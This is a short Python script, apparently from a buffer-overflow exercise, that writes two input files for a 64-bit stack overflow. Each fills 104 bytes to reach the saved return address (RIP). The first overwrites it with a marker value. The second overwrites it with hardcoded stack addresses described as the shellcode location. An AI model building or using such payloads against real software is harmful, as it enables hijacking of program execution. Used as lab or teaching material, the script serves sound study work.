#!/usr/bin/env python
from struct import *

buf = ""
buf += "A"*104                      # offset to RIP
buf += pack("<Q", 0x424242424242)   # overwrite RIP with 0x0000424242424242
buf += "C"*290                      # padding to keep payload length at 400 bytes

f = open("in400safe.txt", "w")
f.write(buf)

buf = ""
buf += "A"*104                      # offset to RIP
buf += pack("<Q", 0x7fffffffef35)   # overwrite RIP with shellcode location
buf += pack("<Q", 0x7fffffffef4b)   # overwrite RIP with shellcode location

f = open("inShellCodeTarget.txt", "w")
f.write(buf)
